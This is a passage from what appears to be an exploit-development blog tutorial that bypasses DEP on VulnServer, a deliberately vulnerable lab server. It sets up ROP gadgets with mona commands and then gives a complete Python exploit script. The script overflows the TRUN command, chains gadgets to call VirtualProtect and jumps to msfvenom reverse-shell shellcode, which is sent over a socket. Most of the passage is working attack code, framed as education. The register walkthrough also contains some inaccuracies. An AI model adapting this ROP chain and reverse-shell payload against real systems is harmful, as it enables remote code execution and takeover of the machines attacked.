class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003eedi = struct.pack(\"\u0026#x3C;I\", 0x76fe83f7)  # pop edi; ret\nedi += struct.pack(\"\u0026#x3C;I\", 0x625011c7)  # Alternative JMP ESP\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e6.6 Setting up ESI (JMP [EAX])\u003c/h3\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003e# ESI - Pointer to JMP [EAX] gadget\nesi = struct.pack(\"\u0026#x3C;I\", 0x76525760)  # POP ESI # RETN [KERNEL32.DLL]\nesi += struct.pack(\"\u0026#x3C;I\", 0x75e95833)  # JMP [EAX] [KERNELBASE.dll]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eCurrent Value\u003c/strong\u003e: 0x75e95833 (JMP [EAX] instruction)\n\u003cstrong\u003eReason\u003c/strong\u003e: This technique is crucial for our exploit. After PUSHAD, execution continues at the address in ESI. This gadget will jump to the address pointed to by EAX (which we'll set to VirtualProtect).\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eHow we found it\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e!py mona find -type instr -s \"pop esi\" -m \"kernel32\" -cpb \"\\x00\"\n!py mona find -type instr -s \"jmp dword ptr [eax]\" -m \"kernelbase\" -cpb \"\\x00\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eAlternative Options\u003c/strong\u003e:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eCALL [EAX] instead of JMP\u003c/strong\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003eesi = struct.pack(\"\u0026#x3C;I\", 0x76525760)  # pop esi; ret\nesi += struct.pack(\"\u0026#x3C;I\", 0x75e9583b)  # call dword ptr [eax]; ret\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e\u003cstrong\u003eDirect IAT pointer technique\u003c/strong\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003eesi = struct.pack(\"\u0026#x3C;I\", 0x76525760)  # pop esi; ret\nesi += struct.pack(\"\u0026#x3C;I\", 0x6250609c)  # VirtualProtect IAT\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e6.7 Setting up EAX (VirtualProtect pointer)\u003c/h3\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003e# EAX - Point to VirtualProtect\neax = struct.pack(\"\u0026#x3C;I\", 0x75ee5082)  # POP EAX # RETN [KERNELBASE.dll]\neax += struct.pack(\"\u0026#x3C;I\", 0x6250609c)  # ptr to \u0026#x26;VirtualProtect() [IAT essfunc.dll]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eCurrent Value\u003c/strong\u003e: 0x6250609c (VirtualProtect IAT entry)\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eReason\u003c/strong\u003e: When ESI (which contains JMP [EAX]) executes, it will jump to the address pointed to by EAX, which is VirtualProtect in the IAT.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eHow we found the gadget\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e!py mona find -type instr -s \"pop eax\" -m \"kernelbase\" -cpb \"\\x00\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eHow we found the IAT entry\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e!dh essfunc -f\ndps essfunc+0x6000 L100\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eAlternative Options\u003c/strong\u003e:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eMOV EAX technique\u003c/strong\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003eeax = struct.pack(\"\u0026#x3C;I\", 0x75f10ada)  # mov eax, 0x6250609c; ret\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e\u003cstrong\u003eArithmetic calculation\u003c/strong\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003eeax = struct.pack(\"\u0026#x3C;I\", 0x77cef70e)  # xor eax, eax; ret\neax += struct.pack(\"\u0026#x3C;I\", 0x75ee0982)  # add eax, 0x6250609c; ret\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e6.8 Using PUSHAD to call VirtualProtect\u003c/h3\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003e# PUSHAD to call VirtualProtect\npushad = struct.pack(\"\u0026#x3C;I\", 0x775d6f67)  # PUSHAD # RETN [msvcrt.dll]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eCurrent Value\u003c/strong\u003e: 0x775d6f67 (PUSHAD; RET instruction)\n\u003cstrong\u003eReason\u003c/strong\u003e: PUSHAD pushes all 8 general-purpose registers onto the stack in a specific order, setting up the parameter stack for VirtualProtect.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eHow we found it\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e!py mona find -type instr -s \"pushad # ret\" -m \"msvcrt\" -cpb \"\\x00\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eAlternative Options\u003c/strong\u003e:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003ePUSHAD from another module\u003c/strong\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003epushad = struct.pack(\"\u0026#x3C;I\", 0x76081981)  # pushad; ret [KERNEL32.dll]\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e\u003cstrong\u003eManual parameter pushing (more complex)\u003c/strong\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003e# Instead of PUSHAD, manually push each parameter\n# Note: This approach is much longer and more complex\nmanual_push = struct.pack(\"\u0026#x3C;I\", 0x77cdeedf)  # pop edi; ret\nmanual_push += struct.pack(\"\u0026#x3C;I\", 0x6250609c)  # VirtualProtect IAT\nmanual_push += struct.pack(\"\u0026#x3C;I\", 0x7654321a)  # push edi; ret\n# ... More pushes for each parameter\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e6.9 JMP ESP Gadget\u003c/h3\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003e# JMP ESP gadget for shellcode execution\njmp_esp = struct.pack(\"\u0026#x3C;I\", 0x625011c7)  # ptr to 'jmp esp' [essfunc.dll]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eCurrent Value\u003c/strong\u003e: 0x625011c7 (JMP ESP instruction)\n\u003cstrong\u003eReason\u003c/strong\u003e: This is where VirtualProtect will return after execution. It jumps to the shellcode on the stack.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eHow we found it\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e!py mona jmp -r esp -m essfunc -cpb \"\\x00\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eAlternative Options\u003c/strong\u003e:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eCALL ESP\u003c/strong\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003ejmp_esp = struct.pack(\"\u0026#x3C;I\", 0x62501205)  # call esp\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e\u003cstrong\u003ePUSH ESP / RET\u003c/strong\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003ejmp_esp = struct.pack(\"\u0026#x3C;I\", 0x625013df)  # push esp; ret\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e7. Complete Exploit Code\u003c/h2\u003e\n\u003cp\u003eLet's put everything together:\u003c/p\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003e#!/usr/bin/python\nimport struct\nimport socket\n\nTARGET_IP = \"192.168.0.112\"\nTARGET_PORT = 9999\ntarget = (TARGET_IP, TARGET_PORT)\n\nVULNSRVR_CMD = b\"TRUN /.:/\"\nTOTAL_BUFFER_LEN = 6000\nOFFSET = 2003\n\n# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.10 LPORT=4444 -f python -b '\\x00'\nbuf =  b\"\" # Shellcode generated by msfvenom - full bytes omitted for brevity\n...\n\n# Build the final ROP chain\nrop = b\"\"\n# EBP - Stack pivot setup (using POP EBP # RETN as placeholder/alignment)\nrop += struct.pack(\"\u0026#x3C;I\", 0x775d8836)  # POP EBP # RETN [msvcrt.dll]\nrop += struct.pack(\"\u0026#x3C;I\", 0x775d8836)  # Value for EBP (can be anything, using gadget address)\n# EBX - Setup Size parameter (0x201) for VirtualProtect\nrop += struct.pack(\"\u0026#x3C;I\", 0x75f366b4)  # POP EAX # RETN [KERNELBASE.dll]\nrop += struct.pack(\"\u0026#x3C;I\", 0xfffffdff)  # Load -0x201 into EAX\nrop += struct.pack(\"\u0026#x3C;I\", 0x76505808)  # NEG EAX # RETN [KERNEL32.DLL] (EAX = 0x201)\nrop += struct.pack(\"\u0026#x3C;I\", 0x77597926)  # XCHG EAX,EBX # RETN [msvcrt.dll] (EBX = 0x201)\n# EDX - Setup Protection flag (0x40) for VirtualProtect\nrop += struct.pack(\"\u0026#x3C;I\", 0x75d91838)  # POP EAX # RETN [KERNELBASE.dll]\nrop += struct.pack(\"\u0026#x3C;I\", 0xffffffc0)  # Load -0x40 into EAX\nrop += struct.pack(\"\u0026#x3C;I\", 0x76505808)  # NEG EAX # RETN [KERNEL32.DLL] (EAX = 0x40)\nrop += struct.pack(\"\u0026#x3C;I\", 0x77d9e6c0)  # XCHG EAX,EDX # RETN [ntdll.dll] (EDX = 0x40)\n# ECX - Setup lpflOldProtect parameter for VirtualProtect\nrop += struct.pack(\"\u0026#x3C;I\", 0x775f94ee)  # POP ECX # RETN [msvcrt.dll]\nrop += struct.pack(\"\u0026#x3C;I\", 0x7653a3c1)  # \u0026#x26;Writable location [KERNEL32.DLL] (ECX = ptr)\n# EDI - Setup Return Address (used as ROP NOP here)\nrop += struct.pack(\"\u0026#x3C;I\", 0x76fe83f7)  # POP EDI # RETN [WS2_32.DLL]\nrop += struct.pack(\"\u0026#x3C;I\", 0x7650580a)  # RETN (ROP NOP) [KERNEL32.DLL]\n# ESI - Setup Pointer to JMP [EAX] gadget (used after PUSHAD)\nrop += struct.pack(\"\u0026#x3C;I\", 0x76525760)  # POP ESI # RETN [KERNEL32.DLL]\nrop += struct.pack(\"\u0026#x3C;I\", 0x75e95833)  # JMP [EAX] [KERNELBASE.dll]\n# EAX - Setup Pointer to VirtualProtect IAT entry\nrop += struct.pack(\"\u0026#x3C;I\", 0x75ee5082)  # POP EAX # RETN [KERNELBASE.dll]\nrop += struct.pack(\"\u0026#x3C;I\", 0x6250609c)  # ptr to \u0026#x26;VirtualProtect() [IAT essfunc.dll]\n# PUSHAD - Push registers to stack for VirtualProtect call\nrop += struct.pack(\"\u0026#x3C;I\", 0x775d6f67)  # PUSHAD # RETN [msvcrt.dll]\n# JMP ESP - Return address after VirtualProtect, jumps to shellcode\nrop += struct.pack(\"\u0026#x3C;I\", 0x625011c7)  # ptr to 'jmp esp' [essfunc.dll]\n\n# Add NOP sled and shellcode\nnop = b\"\\x90\" * 16\nfinal_rop = rop + nop + buf # Note: Place shellcode 'buf' after NOPs\n\n# Build the final payload\npayload = VULNSRVR_CMD\npayload += b\"A\" * OFFSET\npayload += final_rop # Use the ROP chain including NOPs and shellcode\npayload += b\"C\" * (TOTAL_BUFFER_LEN - len(payload)) # Padding\n\n# Send the exploit\nwith socket.create_connection(target) as sock:\n    sock.recv(512)  # Welcome message\n    sent = sock.send(payload)\n    print(f\"sent {sent} bytes\")\n    print(\"[x] Exploit sent\")\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e8. Understanding How the Exploit Works\u003c/h2\u003e\n\u003cp\u003eThis exploit uses a \u003ccode\u003eJMP [EAX]\u003c/code\u003e technique combined with \u003ccode\u003ePUSHAD\u003c/code\u003e to call \u003ccode\u003eVirtualProtect\u003c/code\u003e and make our shellcode executable:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eThe initial buffer fills memory until it overwrites the saved \u003ccode\u003eEIP\u003c/code\u003e register at the \u003ccode\u003e2003\u003c/code\u003e byte offset.\u003c/li\u003e\n\u003cli\u003eEIP is overwritten with the address of the first gadget in our ROP chain (e.g., the \u003ccode\u003ePOP EBP\u003c/code\u003e gadget used for alignment/setup).\u003c/li\u003e\n\u003cli\u003eThe ROP chain executes sequentially: Gadgets pop values into \u003ccode\u003eEBP\u003c/code\u003e, \u003ccode\u003eEBX\u003c/code\u003e, \u003ccode\u003eEDX\u003c/code\u003e, \u003ccode\u003eEBX\u003c/code\u003e, \u003ccode\u003eESP\u003c/code\u003e, \u003ccode\u003eEBP\u003c/code\u003e, \u003ccode\u003eESI\u003c/code\u003e, \u003ccode\u003eEDI\u003c/code\u003e, setting them up according to our plan.\u003c/li\u003e\n\u003cli\u003eCrucially, just before \u003ccode\u003ePUSHAD\u003c/code\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eEAX\u003c/code\u003e holds the address of the VirtualProtect IAT pointer (\u003ccode\u003e0x6250609c\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eESI\u003c/code\u003e holds the address of a \u003ccode\u003eJMP DWORD PTR [EAX]\u003c/code\u003e gadget (\u003ccode\u003e0x75e95833\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eEBX\u003c/code\u003e, \u003ccode\u003eEDX\u003c/code\u003e, \u003ccode\u003eECX\u003c/code\u003e hold the required parameters for \u003ccode\u003eVirtualProtect\u003c/code\u003e (\u003ccode\u003edwSize\u003c/code\u003e, \u003ccode\u003eflNewProtect\u003c/code\u003e, \u003ccode\u003elpflOldProtect\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eEDI\u003c/code\u003e and \u003ccode\u003eEBP\u003c/code\u003e hold placeholders or \u003ccode\u003eROP NOP\u003c/code\u003es.\u003c/li\u003e\n\u003c/ul\u003e\n\u003col start=\"5\"\u003e\n\u003cli\u003eThe \u003ccode\u003ePUSHAD\u003c/code\u003e instruction (\u003ccode\u003e0x775d6f67\u003c/code\u003e) executes. It pushes the current values of \u003ccode\u003eEAX\u003c/code\u003e, \u003ccode\u003eECX\u003c/code\u003e, \u003ccode\u003eEDX\u003c/code\u003e, \u003ccode\u003eEBX\u003c/code\u003e, \u003ccode\u003eESP\u003c/code\u003e (original value before \u003ccode\u003ePUSHAD\u003c/code\u003e), \u003ccode\u003eEBP\u003c/code\u003e, \u003ccode\u003eESI\u003c/code\u003e, \u003ccode\u003eEDI\u003c/code\u003e onto the stack. This arranges the parameters needed by \u003ccode\u003eVirtualProtect\u003c/code\u003e at known offsets from the current stack pointer \u003ccode\u003eESP\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eThe \u003ccode\u003eRETN\u003c/code\u003e instruction that is part of the \u003ccode\u003ePUSHAD # RETN\u003c/code\u003e gadget executes. It pops the next value from the stack into \u003ccode\u003eEIP\u003c/code\u003e. Crucially, the way the ROP chain is constructed and aligned means this value popped is the address we loaded into \u003ccode\u003eESI\u003c/code\u003e (\u003ccode\u003e0x75e95833\u003c/code\u003e, the address of the \u003ccode\u003eJMP DWORD PTR [EAX]\u003c/code\u003e gadget). (Assuming the intended technique works as described).\u003c/li\u003e\n\u003cli\u003eExecution jumps to the \u003ccode\u003eJMP DWORD PTR [EAX]\u003c/code\u003e gadget.\u003c/li\u003e\n\u003cli\u003eThis gadget then jumps to the address currently stored in \u003ccode\u003eEAX\u003c/code\u003e, which is the address of the \u003ccode\u003eVirtualProtect\u003c/code\u003e IAT entry (\u003ccode\u003e0x6250609c\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eVirtualProtect\u003c/code\u003e executes. It finds its parameters on the stack where \u003ccode\u003ePUSHAD\u003c/code\u003e placed them. The \u003ccode\u003elpAddress\u003c/code\u003e parameter (effectively the stack pointer \u003ccode\u003eESP\u003c/code\u003e where the shellcode lies after the ROP chain arguments) indicates the memory to modify, \u003ccode\u003edwSize\u003c/code\u003e is \u003ccode\u003e0x201\u003c/code\u003e (from \u003ccode\u003eEBX\u003c/code\u003e via stack), \u003ccode\u003eflNewProtect\u003c/code\u003e is \u003ccode\u003e0x40\u003c/code\u003e (from \u003ccode\u003eEDX\u003c/code\u003e via stack), and \u003ccode\u003elpflOldProtect\u003c/code\u003e points to the writable KERNEL32 address (from \u003ccode\u003eECX\u003c/code\u003e via stack). \u003ccode\u003eVirtualProtect\u003c/code\u003e makes the shellcode memory region executable.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eVirtualProtect\u003c/code\u003e finishes and executes its own \u003ccode\u003eRET\u003c/code\u003e instruction. The return address on the stack at this point is the one originally placed after the \u003ccode\u003ePUSHAD # RETN\u003c/code\u003e gadget sequence in our main ROP chain: the address of our \u003ccode\u003eJMP ESP\u003c/code\u003e gadget (\u003ccode\u003e0x625011c7\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003eThe \u003ccode\u003eJMP ESP\u003c/code\u003e gadget executes, transferring control directly to the \u003ccode\u003eNOP\u003c/code\u003e sled and then the shellcode located immediately following it on the stack.\u003c/li\u003e\n\u003cli\u003eOur shellcode executes, creating a reverse shell (or performing its intended action).\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e9. Tips and Troubleshooting\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eAlways verify gadgets in the debugger to ensure they do exactly what you expect.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eMake sure your gadget addresses don't contain any bad characters (like \\x00 in our case).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eBe aware of gadgets that affect multiple registers. For example, our \"pop ecx\" gadget also pops EDX.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eThe PUSHAD technique requires careful stack alignment. Make sure the stack values are in the right order for VirtualProtect parameters.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eUse breakpoints liberally and check register values at each step to identify issues.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eIf one approach doesn't work, try another. ROP chain development often requires creativity.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eConclusion\u003c/h2\u003e\n\u003cp\u003eBypassing DEP might seem daunting at first, but with a methodical approach and understanding of ROP chains, it becomes a manageable challenge. By carefully selecting gadgets and leveraging Windows APIs like VirtualProtect, we can overcome even sophisticated memory protections.\u003c/p\u003e\n\u003cp\u003eWhat's particularly elegant about this technique is how we're using the operating system's own APIs against it. Instead of trying to break DEP, we're simply asking Windows nicely to change the memory protection for us.\u003c/p\u003e\n\u003cp\u003eRemember that while this technique works reliably for bypassing DEP, modern exploit mitigations rarely exist in isolation. Real-world targets often combine DEP with ASLR, CFG, and other protections that require additional bypass techniques.\u003c/p\u003e\n\u003cp\u003eThe most important takeaway from this exercise isn't just the specific VirtualProtect technique, but the methodology for manually building and understanding ROP chains. By mastering these fundamentals, you'll be well-equipped to tackle even more complex exploitation scenarios.\u003c/p\u003e\n\u003cp\u003eHappy Overflowing!\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003e\u003cem\u003eDisclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.\u003c/em\u003e\u003c/p\u003e\n","excerpt":"Data Execution Prevention (DEP) has been a game-changer in exploit development. The days of simply overflowing a buffer, jumping to your shellcode, and calli...","title":"VirtualProtect DEP Bypass: Step-By-Step Exploit","date":"2025-04-08","tags":["Exploit Development","VulnServer","DEP Bypass","ROP","Buffer Overflow","Windows Exploitation"]}},"__N_SSG":true},"page":"/blog/[slug]","query":{"slug":"virtualprotect_dep_bypass_guide"},"buildId":"EJgAsPo3Kz3qeohT_5Phd","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>
